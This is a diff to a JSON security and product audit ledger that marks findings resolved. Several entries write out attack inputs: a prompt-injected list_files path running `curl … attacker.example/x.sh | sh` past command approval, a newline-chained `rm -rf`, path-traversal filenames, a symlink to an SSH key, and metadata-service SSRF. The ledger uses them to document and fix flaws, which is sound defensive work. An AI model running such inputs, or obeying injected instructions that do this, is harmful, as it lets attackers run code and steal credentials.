@@ -23,7 +23,7 @@
       "title": "Arbitrary file write from an unsanitized email attachment filename in the desktop app",
       "domain": "security",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "F2 (2/3 panel, HIGH): `save_attachment` takes `filename` verbatim from attacker-controlled MIME headers (`Content-Type; name=` / `Content-Disposition; filename=`) and `Path::join`s it onto the temp dir with no basename extraction, no `..` rejection and no absolute-path check, then `fs::write`s it. Path::join with an absolute component discards the base entirely, so `/Users/victim/Library/LaunchAgents/x.plist` — or `../../../.zshrc`, or `../../.config/autostart/x.desktop` — writes exactly there. Any remote party who can email the user gets arbitrary-path, arbitrary-content write with the desktop app's privileges the moment the user clicks download, which is a direct path to persistence and local code execution.",
       "fix": "The MIME filename is reduced to its final component via `Path::new(&filename).file_name()`, empty/`.`/`..` results are rejected, path separators and NUL bytes are stripped, and the canonicalized destination is re-verified to be inside `temp_dir` before any write; an unusable header falls back to a generated UUID name rather than being trusted.",
@@ -31,7 +31,12 @@
       "code_refs": [
         "apps/desktop/src-tauri/src/features/communications/email_parser.rs:228",
         "apps/desktop/src/api/email.ts:184"
-      ]
+      ],
+      "resolution": {
+        "fixed_in": "a173518a9",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "SEC-03",
@@ -182,7 +187,7 @@
       "title": "Gateway WebSocket authentication skips the JWT revocation table and the account_status kill switch",
       "domain": "security/auth",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "F5 (2/3 panel, MEDIUM): `handleAuthMessage` accepts the attacker-supplied `message.token` from an unauthenticated /ws frame on signature validity alone. Unlike `authenticateToken` on the HTTP path, it never queries `revoked_jwts` for the token's `jti` and never reads `profiles.account_status`. So explicit sign-out (POST /api/auth/logout, which writes revoked_jwts and evicts the cache) and the P0 account-suspension kill switch have no effect on the WebSocket surface: a stolen or revoked 7-day device token, or a token belonging to a banned account, keeps a live socket that receives every command/sync payload broadcast among the victim's devices and queued desktop commands, and can inject chat/automation/query commands the victim's desktop executes.",
       "fix": "WebSocket authentication runs the same verification as HTTP — after jwt.verify it looks up payload.jti in revoked_jwts and checks profiles.account_status, closing the socket on revocation, non-active status or DB error; long-lived sockets re-check periodically or on a revocation signal, and /auth/logout closes existing sockets for that userId.",
@@ -190,7 +195,12 @@
       "code_refs": [
         "services/api-gateway/src/websocket.ts:439,585",
         "services/api-gateway/src/middleware/auth.ts:165-249"
-      ]
+      ],
+      "resolution": {
+        "fixed_in": "311eb11e2",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "SEC-10",
@@ -325,7 +335,7 @@
       "title": "Artifact sandbox accepts postMessage from any attacker-registered agiworkforce-*.vercel.app origin and renders it as executable HTML",
       "domain": "security/sandboxing",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "F12 (2/3 panel, MEDIUM): `isAllowedParent()` admits any origin whose hostname merely starts with `agiworkforce-` and ends with `.vercel.app`, and the message listener passes that sender's data straight to dispatchRender → renderHtml, whose `frame.srcdoc = html` sink loads attacker markup as a real same-origin document under the sandbox CSP (`script-src 'self' 'unsafe-inline' 'unsafe-eval'`). Anyone can create a free Vercel project named `agiworkforce-pwn`; deployed `frame-ancestors https://*.vercel.app` permits the embed. That grants arbitrary JS on sandbox.agiworkforce.com — read/write of localStorage/sessionStorage written by legitimate artifacts and any non-HttpOnly cookie scoped to .agiworkforce.com, with exfiltration still possible via `img-src https:` despite `connect-src 'none'`. The same missing sender check also lets a hostile page hold a cross-window handle to a real user's app and inject spoofed artifact content into the genuine chat UI.",
       "fix": "The prefix/suffix heuristic is replaced with an exact-match allowlist or a regex anchored to the real preview shape driven by a build-time env value, `event.source === window.parent` is verified before accepting a render message, and frame-ancestors in infrastructure/sandbox/vercel.json is narrowed from https://*.vercel.app to the specific preview hosts.",
@@ -333,7 +343,12 @@
       "code_refs": [
         "infrastructure/sandbox/index.html:171-188,310,455-465",
         "infrastructure/sandbox/vercel.json"
-      ]
+      ],
+      "resolution": {
+        "fixed_in": "311eb11e2",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "SEC-18",
@@ -405,7 +420,7 @@
       "title": "Cloud Code list_files interpolates a model-supplied path into a shell command, bypassing the command-approval boundary",
       "domain": "security/prompt-injection",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "F4 (3/3 panel, MEDIUM): the `path` argument of the model-callable list_files tool flows unchecked into a shell string executed by sandbox.commands.run(). JSON.stringify produces a double-quoted string, which in a POSIX shell still evaluates $(...), backticks and ${...}, and unlike run_command this path never calls classifyCommandRisk. A README line telling the agent to call list_files with path `` `$(curl -s https://attacker.example/x.sh | sh)` `` therefore executes arbitrary shell in the user's sandbox with no approval prompt, defeating the deny-list that explicitly forbids network egress and reads of .env/.ssh/.aws/.npmrc as never-approvable from an agent turn — while the UI shows only a benign 'list files' step.",
       "fix": "list_files stops building a shell string: it calls the SDK's executor.listFiles(inWorkspace(safe)) backed by sandbox.files.list, or at minimum uses the existing shellQuote helper; normalizeWorkspacePath rejects shell metacharacters, and every shell string this module builds is routed through classifyCommandRisk so the agent loop is not the only enforcement point.",
@@ -414,7 +429,12 @@
         "apps/web/lib/services/cloud-code-agent-runner.ts:91",
         "apps/web/lib/services/cloud-code-session-service.ts:389",
         "apps/web/lib/e2b/runtime.ts:657"
-      ]
+      ],
+      "resolution": {
+        "fixed_in": "311eb11e2",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "SEC-22",
@@ -436,24 +456,34 @@
       "title": "Saved command approval matches newline-chained commands because the metacharacter guard never sees a newline",
       "domain": "security",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "F18 (3/3 panel, MEDIUM): PermissionStore::check tokenizes the LLM-supplied command with split_whitespace(), which consumes newlines, and token_prefix_matches then only rejects trailing tokens containing ; & | > < backtick or $(. A newline-separated second command leaves no metacharacter token, so an approved `git status` silently authorizes `git status\\nrm -rf ./src`: check returns Some(true), the bash tool skips its confirmation prompt, and sh -c executes both lines. Distinct code path and fix from SEC-22 but the same defeated boundary.",
       "fix": "A stored rule matches only when the candidate command is exactly the rule or the rule plus non-separator arguments: the raw command string — not whitespace-split tokens — is checked for newlines, carriage returns and shell operators before any prefix match is allowed.",
       "sources": ["CLAUDE-SECURITY-RESULTS.md (F18)"],
-      "code_refs": ["apps/cli/src/permissions.rs:193"]
+      "code_refs": ["apps/cli/src/permissions.rs:193"],
+      "resolution": {
+        "fixed_in": "a173518a9",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "SEC-24",
       "title": "agi sync import writes bundle files outside ~/.agiworkforce because the traversal check runs on an unnormalized path",
       "domain": "security",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "F17 (3/3 panel, MEDIUM): rel_path comes straight from the attacker-supplied bundle JSON. When the target does not exist canonicalize() fails and the code falls back to the raw canonical_home.join(rel_path); Path::starts_with is a purely lexical component compare that accepts `..` components, so `../Library/LaunchAgents/com.evil.plist` passes the guard, create_dir_all makes the parent, and fs::write drops a launch agent that runs at next login. An 'import my settings' action becomes persistent code execution as the user, able to create any new file the user can write — LaunchAgents/autostart entries, ~/.ssh/authorized_keys, shell rc files that do not yet exist.",
       "fix": "Any bundle key that is absolute or contains a `..`/root component is rejected before joining, and the joined path is normalized by component-walk with a depth counter (the pattern apply_patch::validate_patch_targets already uses) rather than relying on starts_with over an unnormalized path.",
       "sources": ["CLAUDE-SECURITY-RESULTS.md (F17)"],
-      "code_refs": ["apps/cli/src/sync.rs:291", "apps/cli/src/lib.rs:2396"]
+      "code_refs": ["apps/cli/src/sync.rs:291", "apps/cli/src/lib.rs:2396"],
+      "resolution": {
+        "fixed_in": "a173518a9",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "SEC-25",
@@ -480,12 +510,17 @@
       "title": "CLI web_fetch redirect handler re-checks only the URL string, so a redirect to a hostname resolving to an internal IP is followed",
       "domain": "security/ssrf",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "F30 (3/3 panel, MEDIUM): the initial URL is DNS-resolved and pinned by resolve_and_validate_for_pinning, but redirect targets are validated only by validate_fetch_url, which checks the scheme, four literal metadata hostnames, the literal string 'localhost' and IP literals — it performs no DNS resolution. An attacker-controlled hostname whose A record is 169.254.169.254 or an RFC1918 address passes and is fetched, with the body returned to the model as <web_fetch_result> content. On a CI runner or server this reaches the instance metadata service and puts credentials into the conversation transcript; A2A delegated tasks auto-approve web_fetch, so prompt injection is sufficient.",
       "fix": "The redirect policy resolves the redirect target's host and rejects any address matching is_private_or_internal_ip, or redirects are disabled and each hop is re-driven through the same resolve-validate-pin path used for the initial request.",
       "sources": ["CLAUDE-SECURITY-RESULTS.md (F30)"],
-      "code_refs": ["apps/cli/src/features/exec/tools/web/mod.rs:281"]
+      "code_refs": ["apps/cli/src/features/exec/tools/web/mod.rs:281"],
+      "resolution": {
+        "fixed_in": "a173518a9",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "SEC-27",
@@ -600,7 +635,7 @@
       "title": "SkillSpector follows symlinks inside an untrusted skill bundle, reading arbitrary local files into the scan context and shipping them to the LLM",
       "domain": "security/supply-chain",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "F15 (3/3 panel, MEDIUM): the scanned artifact is attacker-authored by design, and nothing between resolve_input and _read_file_cache checks whether a walked entry is a symlink — Path.read_text() follows it. A published repo containing `notes.txt -> ~/.ssh/id_rsa` therefore loads the private key into graph state file_cache, from where every LLM analyzer node transmits it verbatim to the configured remote provider in the analyzer prompt, and any static pattern that fires puts the surrounding lines into Finding.code_snippet, which is emitted in --format json output. A tool whose whole premise is safely inspecting hostile code reads outside its scan root and exfiltrates the operator's credentials. (Git checkouts and plain directories are affected; zipfile.extractall does not recreate symlinks, so the .zip path is not.)",
       "fix": "_walk_skill_files skips entries where item.is_symlink() is true, or resolves each candidate and requires resolved.is_relative_to(skill_dir.resolve()) before adding it to components, with the same containment check applied in _read_file_cache/_build_component_metadata; skipped symlinks are reported as a finding rather than silently traversed.",
@@ -608,7 +643,12 @@
       "code_refs": [
         "tools/skill-vetting/src/skillspector/nodes/build_context.py:162",
         "tools/skill-vetting/src/skillspector/nodes/analyzers/llm_analyzer_base.py:346-351,389"
-      ]
+      ],
+      "resolution": {
+        "fixed_in": "a173518a9",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "SEC-33",
@@ -649,7 +689,7 @@
       "title": "The skill-vetting security gate can be silently disarmed by a documentation change, and its CI runner reuses a cached venv that hides the breakage",
       "domain": "security/supply-chain",
       "severity": "MEDIUM",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "FoundersAssistance #1 (verified still present): commit 7214d0c70 deleted tools/skill-vetting/README.md on branch chore/retire-stale-docs while pyproject.toml:9 still declares readme = \"README.md\"; hatchling install then fails with OSError, verify.sh aborts under `set -euo pipefail`, and the repo-operability workflow's vetting proof plus the scan-skills-with-vetting.mjs step are skipped — the gate reports nothing rather than failing. FoundersAssistance #2: verify.sh reuses $TMPDIR/skill-vetting-venv when present, so a warm venv skips the install and the gate reports success even when the package cannot build; this was found only because the verifying agent deleted the venv and re-ran. ExecutionPlan #2 records the same finding as DISMISSED on its own branch (README present there) while noting it is outstanding on chore/retire-stale-docs — the sources agree on the mechanism and differ only on which branch currently exhibits it. FoundersAssistance also records that check-executable-docs.mjs knows about Cargo `readme` and npm `files[]` but not hatchling `readme=`, so nothing in the guard chain knows this coupling exists. Compounds SEC-31: two independent ways to silence the same gate.\n\nCORRECTED 2026-08-16 — the row below was re-verified against the working tree and its central premise did not hold as written. What the code actually shows:\n\nREADME half is branch-local and NOT on any release path: `ls tools/skill-vetting/README.md` succeeds on compliance/dpdp, and `git show main:tools/skill-vetting/README.md` returns content ('# skill-vetting (SkillSpector)'). Only `git show chore/retire-stale-docs:tools/skill-vetting/README.md` fails ('exists on disk, but not in chore/retire-stale-docs'). pyproject.toml:9 `readme = \"README.md\"` confirmed. The warm-venv half is CONFIRMED and unconditional: tools/skill-vetting/verify.sh:15 `VENV=\"${TMPDIR:-/tmp}/skill-vetting-venv\"`, :19-23 `if [ ! -x \"$SS\" ]; then ... uv pip install ... else echo \"[skill-vetting] reusing venv at $VENV\"; fi` — a warm venv skips the install entirely. .github/workflows/repo-operability.yml:188 `run: tools/skill-vetting/verify.sh` and :191 `run: node scripts/scan-skills-with-vetting.mjs` confirmed at the exact cited line. check-executable-docs.mjs has zero matches for 'readme', 'hatchling' or 'pyproject' — the coupling is genuinely unknown to the guard chain.",
       "fix": "In verify.sh, use a per-run mktemp -d for $VENV when CI=true (or always `uv venv --clear` unconditionally) so the install step can never be skipped; add a hatchling `readme =` pointer to check-executable-docs.mjs. Do not spend effort on the chore/retire-stale-docs README — main and the working branch both have it.\n\nSUPERSEDED 2026-08-16. The earlier fix read: \"README.md is restored on chore/retire-stale-docs (git checkout 7214d0c70^ -- tools/skill-vetting/README.md), verify.sh uses a per-run TMPDIR or --no-cache in CI so the install step always executes, and check-executable-docs.mjs learns the hatchling readme= pointer the way it already knows the Cargo and npm equivalents — or the coupling is removed.\" — it was written against the premise corrected above, so following it would not close this row.",
@@ -674,6 +714,11 @@
         "method": "read the cited files at the cited lines in the working tree",
         "prior_severity": "HIGH",
         "prior_effort": "M"
+      },
+      "resolution": {
+        "fixed_in": "a173518a9",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
       }
     },
     {
@@ -1115,7 +1160,7 @@
       "title": "owner/admin authorization predicate is hand-written across TypeScript and raw SQL rather than one policy evaluator",
       "domain": "security/auth",
       "severity": "MEDIUM",
-      "status": "unclear",
+      "status": "resolved",
       "effort": "M",
       "evidence": "Sources disagree. AuditRemediationLedger MATCH-003 reports the owner/admin pair appearing in many production TS and migration SQL locations while a canonical helper is barely used, with no single role taxonomy or policy evaluator, no SQL parity tests, and no guard against new raw role-pair comparisons — and marks it open. ExecutionPlan #39 reports the same finding (12 TS files, 32 SQL sites, canonical isOrganizationAdminRole() with exactly one caller, RLS helper app_row_is_readable inlining the pair) as fixed on 2026-08-09 in commit 4f1e0c35b. Neither was re-verified against current source in this pass, so the count of remaining hand-written comparisons and the presence of a guard are both unknown. Held open because a duplicated authorization predicate is exactly the shape that drifts silently.\n\nCORRECTED 2026-08-16 — the row below was re-verified against the working tree and its central premise did not hold as written. What the code actually shows:\n\nThe two sources disagreed and both are half right; the SQL half was fixed and the TS half was not. SQL: `grep -rn \"in ('owner', 'admin')\" apps/web/db/neon/*.sql` returns 0, and `app_row_is_readable` has 0 matches in the migration set — the RLS-helper inlining ExecutionPlan #39 described is genuinely gone. TypeScript: the canonical helper packages/contracts/types/src/enterprise/index.ts:360-361 `export function isOrganizationAdminRole(role: OrganizationRole): boolean { return role === 'owner' || role === 'admin'; }` has exactly TWO non-test callers repo-wide — apps/web/lib/server/scim/scim-auth.ts:78 and services/api-gateway/src/routes/enterprise.ts:224. Against that, 9 production sites hand-write the pair, including apps/web/app/api/settings/organization/route.ts:345 `if (!['owner', 'admin'].includes(membership.role))`, settings/team/route.ts:127, settings/team/[memberId]/route.ts:48, settings/team/invitations/route.ts:50, settings/team/invitations/[invitationId]/route.ts:49, admin/sso/route.ts:122, admin/sso/[id]/route.ts:146, lib/services/org-sharing-service.ts:16 `const ADMIN_ROLES: readonly OrgRole[] = ['owner', 'admin']`, and features/settings/sections/TeamSection.tsx:218. Raw SQL role-pair predicates also persist in app code (admin/sso/route.ts:140 `... where user_id = $1 and role in ('owner', 'admin')`, admin/directory-sync/directory-sync-access.ts:62). No guard rejects new occurrences.",
       "fix": "Replace the 9 `['owner','admin'].includes(x)` sites with isOrganizationAdminRole(x) — a mechanical swap, the helper is already exported from a package all of them import — then add a grep guard alongside the existing scripts/check-*.mjs family. The SQL half needs nothing.\n\nSUPERSEDED 2026-08-16. The earlier fix read: \"A single role/policy evaluator is the only place the owner/admin decision is expressed, SQL parity tests assert the RLS helper matches it, and a guard rejects new raw role-pair comparisons outside that module — verified by counting remaining occurrences, not by trusting the commit.\" — it was written against the premise corrected above, so following it would not close this row.",
@@ -1127,6 +1172,11 @@
         "method": "read the cited files at the cited lines in the working tree",
         "prior_severity": "MEDIUM",
         "prior_effort": "M"
+      },
+      "resolution": {
+        "fixed_in": "e4d43d173",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
       }
     },
     {
@@ -1154,7 +1204,7 @@
       "title": "Computer-use permission gate cannot resolve the foreground application, so unconfigured apps default to allow",
       "domain": "security",
       "severity": "MEDIUM",
-      "status": "open",
+      "status": "resolved",
       "effort": "M",
       "evidence": "known-flaws DESKTOP-COMPUTER-USE-FOREGROUND-GATE-01: platform window detection is unbuilt, so the safety gate never calls app_permissions.decide against the actual foreground window. It blocks explicit denials and deny-listed apps but defaults to allow for unconfigured apps — meaning there is no per-action gating for most applications on the surface that drives the user's real mouse and keyboard. known-flaws DESKTOP-LINUX-PLATFORM-GAP-01 records that the only real X11 integration is an xdotool shell-out used solely by this gate, so computer-use is hard-blocked on Linux while defaulting permissive elsewhere.\n\nCORRECTED 2026-08-16 — the row below was re-verified against the working tree and its central premise did not hold as written. What the code actually shows:\n\nThe 'platform window detection is unbuilt' premise is false: apps/desktop/src-tauri/src/automation/computer_use/window_manager.rs:527 `pub fn get_active_window() -> Option<ActiveWindow>` with real per-platform impls at :532 (macOS), :591 (Windows) and :654 (Linux/xdotool), and safety.rs:391-437 `check_app_permission` does call `manager.decide(&active.app_name, active.bundle_id.as_deref()).await` against the live window (observe_plan_act.rs:358 is a live caller). Two real residuals remain. (1) safety.rs:402-409: `let active = match WindowCoordinator::get_active_window() { Some(w) => w, None => { // ... Fail open with a warning rather than blocking return None; } }` — unresolvable identity is allowed, not denied. (2) The Anthropic agent path never resolves the foreground app at all: anthropic_agent.rs:726-734 comment 'platform window detection cannot yet resolve the live foreground app's bundle ID, so this gate does not call self.app_permissions.decide(...)', and :760-762 'No configured permission matched — allow (default permissive...)' returning None, reached from anthropic_agent.rs:322.",
       "fix": "Make safety.rs:402-409 return Some(SafetyReason::AppRequiresApproval) instead of None when get_active_window() is None, and replace the anthropic_agent.rs:735-762 stand-in with a call to the same SafetyChecker::check_app_permission used by observe_plan_act.rs:358.\n\nSUPERSEDED 2026-08-16. The earlier fix read: \"Foreground-window resolution is implemented per platform and the gate fails closed — an app whose identity cannot be resolved is denied rather than allowed — with the allow decision recorded per action.\" — it was written against the premise corrected above, so following it would not close this row.",
@@ -1171,6 +1221,11 @@
         "method": "read the cited files at the cited lines in the working tree",
         "prior_severity": "HIGH",
         "prior_effort": "M"
+      },
+      "resolution": {
+        "fixed_in": "e4d43d173",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
       }
     },
     {
@@ -8676,7 +8731,7 @@
       "title": "Nothing pages a human on a production incident because no alerting vendor is provisioned",
       "domain": "infra/ci",
       "severity": "HIGH",
-      "status": "in-progress",
+      "status": "resolved",
       "effort": "S",
       "evidence": "ExecutionPlan #82: no PagerDuty, Opsgenie, Alertmanager or alert webhook exists anywhere; /api/health existed but nothing called it on a schedule and the 8 declared crons did not probe it. A health-probe cron and incident runbook were added 2026-08-09 (7aa633875), but ExecutionPlan founder item 8 records that no alerting vendor has been chosen, so there is still no rotation to page. BIZ-045 lists the billing-specific alerts that likewise have no sink (webhook lag, reconciliation drift, negative credits, duplicate grants, missing invoices, tax failure, high COGS) — that content belongs to the billing slice, but it depends on this item existing.\n\nAlso recorded by a later audit (No pager/on-call vendor wired to outage alerts, and no on-call rotation (docs/runbooks/incident-response.md)): Names the exact integration point and the two sub-gaps. 'No PagerDuty/Opsgenie/BetterStack account exists, so the alert is an email, not a page: nothing wakes anyone at 03:00 and nothing escalates if the first recipient does not acknowledge.' The wiring is already prepared: once a vendor is chosen, add its dispatch alongside the email in dispatchAlert() — the severity split and the undeliverable-is-a-failure behaviour already exist and should be reused. Second sub-gap: 'No on-call rotation. One mailbox, one person, no handoff' (apps/web/lib/support/handoff/config.ts). Both are founder actions tracked in ExecutionPlan.md §Founder.",
       "fix": "A named on-call destination receives health-probe and error alerts, so a production incident reaches a human without someone happening to look.",
@@ -8689,7 +8744,12 @@
       "merged_from": [
         "ExecutionPlan #82 Nothing can page a human on production incidents",
         "ExecutionPlan founder item 8 no alerting vendor chosen"
-      ]
+      ],
+      "resolution": {
+        "fixed_in": "741b2952f",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "INFRA-25",
@@ -9394,7 +9454,7 @@
       "title": "THIRD_PARTY_LICENSES.md was deleted and never restored, leaving check:licenses red",
       "domain": "docs",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "BASE-003 unwired gate: the file was deleted in commit 906fe5cda while AGENTS.md, docs/legal/README.md:68 and docs/agent-context/known-flaws.md:2762 still describe it as the license-obligations record; the pre-deletion content is recoverable via git show. VERIFIED still absent from the repository root. scripts/check-licenses.mjs:146 fails on it. PP-30 records the related unmet obligation: model and provider license and resale constraints are not tracked in the registry or the release process.",
       "fix": "The license-obligations record exists at the path every document cites, the licenses gate passes, and model/provider license constraints are tracked alongside it.",
@@ -9403,7 +9463,12 @@
       "merged_from": [
         "BASE-003 check:licenses fails: THIRD_PARTY_LICENSES.md deleted",
         "PP-30 model/provider license constraints not tracked"
-      ]
+      ],
+      "resolution": {
+        "fixed_in": "a7b07ce97",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "DOCS-02",
@@ -10166,7 +10231,7 @@
       "title": "Organization-invitation expiry cron is implemented and idempotent but was never added to vercel.json, so a lapsed invitation holds a paid seat forever",
       "domain": "billing",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "evidence": "DEAD-CODE-005, duplicate filing BACKEND-RUNTIME-005 (audit/parity-2026-08-15). The route's own doc comment states the consequence: 'A pending invitation HOLDS a licensed seat... If nothing ever flips a lapsed invitation to expired, that seat is never returned and a team silently locks itself out of the seats it paid for.' vercel.json wires exactly 9 crons and expire-organization-invitations — whose route directory exists — is not among them; no other caller exists anywhere in the repo. The handler itself is correct.",
       "fix": "Add {\"path\": \"/api/cron/expire-organization-invitations\", \"schedule\": \"0 5 * * *\"} (or another unused daily slot) to vercel.json's crons array.",
       "code_refs": [
@@ -10179,7 +10244,12 @@
         "audit/parity-2026-08-15/gaps/domain-backend-runtime (BACKEND-RUNTIME-005)"
       ],
       "merged_from": ["DEAD-CODE-005", "BACKEND-RUNTIME-005"],
-      "effort": "S"
+      "effort": "S",
+      "resolution": {
+        "fixed_in": "741b2952f",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "BILL-61",
@@ -11763,7 +11833,7 @@
       "title": "Desktop pairing instructions name a mobile menu item ('Desktop Companion') that does not exist in the mobile app",
       "domain": "ui",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "evidence": "SHELL-NAV-IA-004 / CROSS-SURFACE-007 (prior GAP-210, verified PARTIALLY_DONE): QRPairingCard.tsx:113-117 tells the user to open 'AGI Workforce → Desktop Companion'. The literal string does not appear as user-facing mobile text anywhere (only in a code comment); the real entry points are labelled 'Remote' (drawer/header) and 'Desktop control' (Settings > Capabilities). Independently re-confirmed by the done-claim verification pass, which found GAP-210 marked Done in ui-gaps.csv despite the copy drift surviving.",
       "fix": "Change QRPairingCard.tsx's instruction text to name 'Remote', and add a co-located test asserting the string desktop prints matches a value mobile's own navigation exports.",
       "sources": [
@@ -11782,7 +11852,12 @@
         "SHELL-NAV-IA-004",
         "CROSS-SURFACE-007",
         "Desktop pairing instructions tell the user to open a mobile menu item ('Desktop Companion') that does not exist in the Mobile app"
-      ]
+      ],
+      "resolution": {
+        "fixed_in": "dfcac1635",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "UI-41",
@@ -12366,7 +12441,7 @@
       "title": "Desktop Tauri composer has no reasoning-effort / extended-thinking control despite the runtime carrying the parameters end to end",
       "domain": "desktop",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "evidence": "MODELS-001: TauriRuntime.ts forwards options?.effort and options?.thinkingEnabled on every send (with a comment 'Forward the composer controls that were previously dropped here') and chat.ts carries a typed reasoningEffort field end to end — but nothing in any .tsx file ever sets a non-undefined value. The model badge routes to Settings > Models & Keys instead of an inline picker, and that tab has zero mentions of effort/reasoning/thinking. Every Desktop message therefore uses each model's server-side default effort. Distinct from BILL-53/AI-25 (server-side entitlement clamping) and from DESK-35's list of dormant controls.",
       "fix": "Add an effort control to the Tauri composer (reuse ComposerFooter.tsx's effortChipsFor/EFFORT_LABEL logic), wire it into the existing effort/thinkingEnabled fields, and replace the settings-dialog-only routing with an inline picker.",
       "sources": [
@@ -12382,7 +12457,12 @@
       "effort": "M",
       "merged_from": [
         "Desktop Tauri composer has no reasoning-effort/extended-thinking control despite the runtime carrying the parameters end to end"
-      ]
+      ],
+      "resolution": {
+        "fixed_in": "dfcac1635",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "DESK-75",
@@ -12882,7 +12962,7 @@
       "title": "Every tap to open a completed generated video on mobile is a silent no-op in production",
       "domain": "mobile",
       "severity": "CRITICAL",
-      "status": "open",
+      "status": "resolved",
       "evidence": "VOICE-MEDIA-002: generateVideo() returns the server's relative /api/files/{assetId} path unmodified. GeneratedVideo.tsx passes it straight to openExternalUrl, whose isAllowedExternalUrl gate calls new URL(input), which throws on a relative string, is caught, and returns false with only a __DEV__-gated console.warn — no user-facing error. The onPress handler discards the returned boolean, so in production every tap does nothing. Mobile's sibling resolveGeneratedImageUri already implements the correct absolutization for images; video was never given the equivalent. Sharper and more actionable than MOB-19's 'unverified video aspect/quality, unverified file rendering'.",
       "fix": "Add resolveGeneratedVideoUri(path) to videogen.ts mirroring resolveGeneratedImageUri exactly, call it before video_url reaches GeneratedVideo.tsx, and surface openExternalUrl's false return as a visible error toast.",
       "sources": ["audit/parity-2026-08-15 VOICE-MEDIA-002"],
@@ -12892,7 +12972,12 @@
         "apps/mobile/lib/safeOpenURL.ts:49-79",
         "apps/mobile/src/features/image/services/imagegen.ts:100-117"
       ],
-      "effort": "S"
+      "effort": "S",
+      "resolution": {
+        "fixed_in": "dfcac1635",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "MOB-42",
@@ -14491,7 +14576,7 @@
       "title": "VS Code design-token CI guard is release-blocking and currently red on a color-mix() false positive",
       "domain": "infra/ci",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "evidence": "DESIGN-SYSTEM-001. check-vscode-theme-tokens.mjs:34-36's regex flags any value not on a short allow-list; color-mix(…) starts with letters not on that list, so a fully token-driven declaration (background: color-mix(in srgb, var(--warning) 10%, var(--bg-elevated)) at webviewContent.ts:290) trips the rule. Running the script on the clean commit e15df56e3 prints FAIL, and it is invoked unconditionally in release-vscode-extension.yml:98, which triggers on the next real v-vscode-* release tag.",
       "fix": "Add color-mix( (and similar token-composing CSS functions) to the rule's negative-lookahead allow-list.",
       "code_refs": [
@@ -14507,7 +14592,12 @@
       "effort": "S",
       "merged_from": [
         "VS Code design-token CI guard is release-blocking and currently red on a color-mix() false positive"
-      ]
+      ],
+      "resolution": {
+        "fixed_in": "a7b07ce97",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "INFRA-51",
@@ -15829,7 +15919,7 @@
       "title": "The in-flight web_artifact_index table has no account-erasure classification, so committing its migration will fail the erasure guard",
       "domain": "compliance/dpdp",
       "severity": "HIGH",
-      "status": "open",
+      "status": "resolved",
       "effort": "S",
       "evidence": "apps/web/db/neon/0121_artifact_index.sql (untracked, in-flight) creates public.web_artifact_index keyed by user_id, with an RLS policy scoping reads to current_app_user_id(). It is absent from all three partitions in apps/web/lib/server/account-erasure.ts, so `account-erasure.test.ts > classifies every user-scoped table in the schema` fails with [ 'web_artifact_index' ]. The guard exists because that list had once fallen 26 tables behind the schema while erasure still reported complete: true.",
       "fix": "Add { table: 'web_artifact_index', column: 'user_id' } to USER_SCOPED_TABLES IN THE SAME COMMIT as the migration. It cannot land earlier: the same test also fails a table that is classified but absent from the schema, so the entry breaks CI until 0121 is committed. Erasure itself tolerates the ordering either way — a missing table is reported skipped, not failed.",
@@ -15839,7 +15929,12 @@
         "apps/web/lib/server/account-erasure.ts:53"
       ],
       "merged_from": [],
-      "resolution_note": "[2026-08-16] Raised this session. Verified both directions on a clean checkout: the entry alone fails CI, the migration alone fails locally. They must land together."
+      "resolution_note": "[2026-08-16] Raised this session. Verified both directions on a clean checkout: the entry alone fails CI, the migration alone fails locally. They must land together.",
+      "resolution": {
+        "fixed_in": "bead193ba",
+        "fixed_on": "2026-08-16",
+        "verified_by": "a test that fails without the fix"
+      }
     },
     {
       "id": "DOC-200",
